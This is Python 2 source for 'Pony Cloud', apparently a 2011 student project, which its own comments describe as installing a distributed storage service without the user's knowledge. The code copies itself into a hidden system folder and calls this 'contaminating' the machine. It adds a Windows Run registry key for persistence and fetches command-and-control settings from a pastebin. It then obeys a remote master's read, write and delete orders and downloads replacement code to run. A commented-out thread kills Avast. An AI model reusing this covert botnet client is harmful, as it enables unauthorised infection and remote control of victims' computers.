#!/usr/bin/env python
# -*- coding: utf-8 -*-

################################################################################
# Projet : Pony Cloud							       #
# Fonction : Installe un service de stockage distribué l'inssu de l'utilisateur#
################################################################################
# Auteur : Groupe 5 (Paul AUDEBERT & Quentin BLANLUET)			       #
################################################################################
#									       #
# Copyleft 2011 by CDAISI						       #
#									       #
################################################################################

import os
import sys
import threading
if sys.platform == "win32" : import _winreg
import shutil
import socket
import threading
import urllib
from time import sleep
from random import randint


class CacahueteError(Exception):
	"""
	Exception permetant d'attraper une déconnexion sale de master
	"""
	pass


def restart() :
	"""
	Fonction relancant le client
	"""
	if sys.platform == "win32" :
		python27 = os.environ["SystemDrive"] + "\Python27\python.exe"
	else :
		python27 = "/usr/bin/python"
	
	client = os.path.join(rep_install, nom_client)
	
	print(u"Redémarrage...")
	os.spawnl(os.P_WAIT, python27, python27, client)


def installation() :
	"""
	Fonction contaminant imediatement le système
	"""
	# On crée le répertoire principal
	try :
		os.mkdir(rep_install)
	except Exception, e :
		print(e)
		sys.exit(1)
	
	if sys.platform == "win32" : os.system("attrib +h " + rep_install)
	
	# On crée le répertoire de stockage des chunks
	os.mkdir(os.path.join(rep_install, rep_data))
	
	# On se copie dans le répertoire
	shutil.copy(os.path.join(rep_courant, nom_client), rep_install)
	
	# On crée un lanceur pour se lancer au démarrage du PC
	# Si on est sous Windows
	if sys.platform == "win32" :
		
		#  On ajoute notre client à l'une des clés "run" du registre
		with _winreg.OpenKey( _winreg.HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", 0, _winreg.KEY_SET_VALUE) as key :
			_winreg.SetValueEx(key, "Pony_Cloud", 0, _winreg.REG_SZ, os.path.join(os.environ["SystemDrive"] + "\Python27\python.exe " + rep_install, nom_client))
	
	# Sinon (système UNIX)
	"""else :
		# On ajoute un lanceur à init.d
		os.system("update-rc.d script.sh defaults")"""
	
	print(u"Machine contaminée.")


def get_conf(pastebin_key) :
	"""
	Fnction récupèrant les parametres à partir deu pastebin
	"""
	page = urllib.urlopen(pastebin_api_read + pastebin_key)
	
	# On parcours chaque ligne du pastebin
	for ligne in page :
		
		# On ne prend pas en compte les commentaire
		if ligne.startswith('#') : continue
		
		# On met notre parametre en dictionnaire
		variable,valeur = ligne.strip(' \r\n').split('=')
		if valeur.isdigit() : valeur = int(valeur)
		conf[variable] = valeur
	
	return conf
	

def def_rep_install() :
	"""
	
	"""
	# Si on est sous Windows
	if sys.platform == "win32" :
		rep_install = os.path.join(os.environ["SystemRoot"], "pony_cloud")	# en génral => C:\\WINDOWS\pony_cloud
	
	# Sinon (système UNIX)
	else :
		rep_install = "/bin/.pony_cloud"
	
	return rep_install


def def_paire_id() :
	"""
	
	"""
	try :
		with open(os.path.join(rep_install, nom_client_id)) as fichier_paire_id :
			paire_id = int(fichier_paire_id.readline().strip("\n"))
	
	except IOError :
		paire_id = randint(1, 2**100)
		with open(os.path.join(rep_install, nom_client_id), 'w') as fichier_paire_id :
			fichier_paire_id.write(str(paire_id))
	
	return paire_id


def read(requete) :
	"""
	
	"""
	# Ici les octets restants de la requête correspondent au chunk_id concerné par l'ordre
	chunk_id = requete[1:]
	with open(os.path.join(rep_install, rep_data, chunk_id),'r') as chunk :
		chunk_data = chunk.read()
	s.send(chunk_data)
	rep = s.recv(len(reponse))
	
	if rep == reponse :
		print(u"Le chunk {0} de {1} octets a été envoyé".format(chunk_id[:10], len(chunk_data)))
	else :
		print(u"Le chunk {0} a été mal envoyé".format(chunk_id[:10], len(chunk_data)))


def write(requete) :
	"""
	
	"""
	# Ici les octets restants de la requête correspondent au chunk_id concerné par l'ordre
	chunk_id = requete[1:]
	chunk_data = s.recv(chunk_taille)
	
	if len(chunk_data) == chunk_taille :
		s.send(reponse)
		print(u"Le chunk {0} de {1} octets a été réceptionné".format(chunk_id[:10], len(chunk_data)))
		with open(os.path.join(rep_install, rep_data, chunk_id),'w') as chunk :
			chunk.write(chunk_data)
	else :
		s.send("er")
		print(u"Le chunk {0} a été mal réceptionné".format(chunk_id[:10], len(chunk_data)))


def delete(requete) :
	"""
	
	"""
	# Ici les octets restants de la requête correspondent au chunk_id concerné par l'ordre
	chunk_id = requete[1:]
	try : os.remove(os.path.join(rep_install, rep_data, chunk_id))
	except OSError : pass
	
	s.send(reponse)
	print(u"Le chunk {0} a été supprimé.".format(chunk_id[:10]))


def echo() :
	"""
	Fonction envoyant un simple signe de vie au master.
	/!\ à terme elle enverra plutôt l'espace libre du disque
	"""
	s.send(reponse)


def maj() :
	"""
	Fonction téléchargent et écrasant le logiciel par la nouvelle version
	"""
	# Téléchargement de la mise à jour
	urllib.urlretrieve(url_maj, os.path.join(rep_install, nom_client))
	print(u"La mise à jour a été faite")
	
	# On relance le client proprement
	os.remove(os.path.join(rep_install, nom_client_lock))
	restart()
	sys.exit(0)


""" Fonction de déboguage, ne pas y faire attention... """
iii = 1
def DEBOGUE(nom_variable, variable) :
	global iii
	print(u"débogue {0} : {1} {2} = {3}".format(iii, nom_variable, type(variable), variable))
	iii += 1
""" ...merci """

################################################################################
# Fonction threadée							       #

def kill_av() :
	"""
	Fonction regardant  régulièrement si avast (seulement, pour le moment) est lancé et le tue
	"""
	antivirus = "AvastSvc.exe"
	
	while 1 :
		# Si on est sous Windows
		if sys.platform == "win32" :
			os.system("taskkill /IM {0} /F".format(antivirus))
		
		# Sinon (système UNIX)
		else :
			os.sysem("killall {0}".format(antivirus))
		
		sleep(10)


################################################################################
# Fonction principale							       #

# Paramêtres
nom_client = os.path.split(sys.argv[0])[1]
nom_client_id = os.path.splitext(nom_client)[0] + ".id"
nom_client_lock = os.path.splitext(nom_client)[0] + ".lock"
rep_courant = os.path.abspath(os.path.dirname(sys.argv[0]))

rep_data = "data/"
rep_install = def_rep_install()

pastebin_api_read = "http://pastebin.com/raw.php?i="
pastebin_key = "kzeJRig7"
url_version = "http://db.tt/0QDhBdhm"
url_maj = "http://db.tt/a0UfGCCW"
version_paire = 0.4
version_courante = float(urllib.urlopen(url_version).readline().strip(' \n'))

dict_ordre = {
	"read":"r",
	"write":"w",
	"delete":"-",
	"echo":"?",
	"quit":"q"
	}

# Variables
conf = {}

# Tests avant de démarrer
if rep_courant == rep_install :
	# On vérrifie qu'il n'existe pas d'autre instance ce qui mettrait le bordel
	if os.path.exists(os.path.join(rep_install, nom_client_lock)) :
		print(u"Processus déjà lancé.")
		sys.exit(1)
else :
	# Si on n'est pas déjà installé
	if not os.path.exists(rep_install) : installation()
	
	# On demarre imadiatement le client dans un nouveau processus
	restart()
	sys.exit(1)

# On vérifier s'il faut metre à jour
if version_courante < version_paire : maj()

try :
	# On crée un vérrou mono-instance
	open(os.path.join(rep_install, nom_client_lock), 'w')

	# On lance un thread qui tuera l'antivirus
	"""
	service = threading.Thread(target=kill_av)
	service.setDaemon(True)
	service.start()
	"""

	# On lit ou génère notre paire_id
	conf["paire_id"] = def_paire_id()

	# Début
	connexion = False
	while 1 :
		try :
			# Si la connexion n'a pas encore été faite (ou à été coupée)
			if not connexion :
				
				# On récupère les parametres
				conf = get_conf(pastebin_key)
				
				# On ouvre une socket TCP (locale) et on la connecte au serveur
				print(u"Tentative de connexion au master.")
				s = socket.socket()
				s.connect((conf["ip"],conf["port"]))
				
				# On envoie notre identifiant
				s.send(str(conf["paire_id"]))
				
				# On indique que la connexion à été faite
				connexion = True
			
			# On attend que le Master veuille quelque chose
			print(u"Attente d'ordre venant du master...")
			requete = s.recv(1+64)
			DEBOGUE("requete", requete)
			
			# On ne poursuit pas si la requête n'est pas formée de caractères alpha-numériques
			if not requete.isalnum() : continue
			
			# Le premier octet de la requête correspond toujours à l'ordre que le Master veux qu'on réalise
			ordre = requete[:1]
			
			# "r" pour le download d'un chunk
			if ordre == dict_ordre["read"] : read(requete)
			
			# "w" pour la création d'un nouveau chunk
			elif ordre == dict_ordre["write"] : write(requete)
			
			# "-" pour la suppression d'un chunk
			elif ordre == dict_ordre["delete"] : delete(requete)
			
			# "?" pour renvoyer notre écho
			elif ordre == dict_ordre["echo"] : echo()
			
			# "q" pour nous dire que le master va couper
			elif ordre == dict_ordre["quit"] : s.close()
			
			# Si on arrive là c'est qu'on est parti en cacahuète à cause d'une déconnection sale du master
			else : raise CacahueteError
		
		except socket.error :
			connexion = False
			sleep(5)
		
		except CacahueteError :
			connexion = False
			sleep(5)
	
	# Pour le principe
	sys.exit(0)

finally : os.remove(os.path.join(rep_install, nom_client_lock))

# Fin									       #
################################################################################
